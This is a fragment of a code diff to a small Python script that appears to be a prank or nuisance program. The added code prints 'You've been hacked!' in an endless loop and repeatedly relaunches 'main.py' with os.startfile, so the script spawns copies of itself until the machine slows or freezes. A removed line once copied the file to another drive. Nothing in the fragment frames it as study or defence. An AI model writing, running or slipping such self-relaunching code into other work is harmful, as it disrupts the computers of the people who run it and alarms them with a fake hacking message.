@@ -9,9 +9,9 @@ import shutil
 
 
 
-os.startfile('openme.py')
+directory = os.getcwd() + '\main.py'
 
-#shutil.copyfile('D:/openme.py', 'N:/openme.py')
 while True:
-    print "You've been hacked"
+    print "You've been hacked!"
+    os.startfile(directory)
    
